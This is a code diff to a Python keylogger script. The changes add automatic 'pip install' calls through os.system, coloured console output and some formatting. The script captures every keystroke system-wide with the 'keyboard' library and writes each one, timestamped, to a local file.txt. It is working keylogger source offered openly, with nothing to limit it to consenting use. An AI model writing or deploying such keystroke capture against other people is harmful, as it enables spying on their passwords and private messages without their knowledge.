@@ -3,8 +3,25 @@
 import keyboard
 import datetime
 import os, threading
+import colorama
 
-print("Key_logging session running...\nOpen file.txt to look at keys pressed...")
+
+def requirements(one, two, *args):
+    try:
+
+        os.system(f"pip install {one}")
+        os.system(f"pip install {two}")
+
+    except Exception as error:
+        print("error occurred while trying to download modules")
+        print(error)
+        os.system("cls")
+        exit()
+
+
+requirements("keyboard", "colorama")
+
+print(colorama.Fore.GREEN + "Key_logging session running...\nOpen file.txt to look at keys pressed..." + colorama.Fore.RESET)
 try:
 
     os.system("Del file.txt")
@@ -21,7 +38,6 @@ finally:
 
 
 def initiate_key_logging():
-
     event = keyboard.read_event()
     with open("file.txt", "a") as keys_pressed:
         keys_pressed.write(f"\n{str(datetime.datetime.now())}\n")
@@ -34,7 +50,8 @@ run = True
 
 def logging_check_loop(state):
     with open("file.txt", "a") as header:
-        header.write("ALL KEYS ARE PRESSED ONCE IF THEY APPEAR TWICE, AND TWICE IF THEY APPEAR FOUR TIMES\n AND SO ON..\n")
+        header.write(
+            "ALL KEYS ARE PRESSED ONCE IF THEY APPEAR TWICE, AND TWICE IF THEY APPEAR FOUR TIMES\n AND SO ON..\n")
     while state is True:
         initiate_key_logging()
 
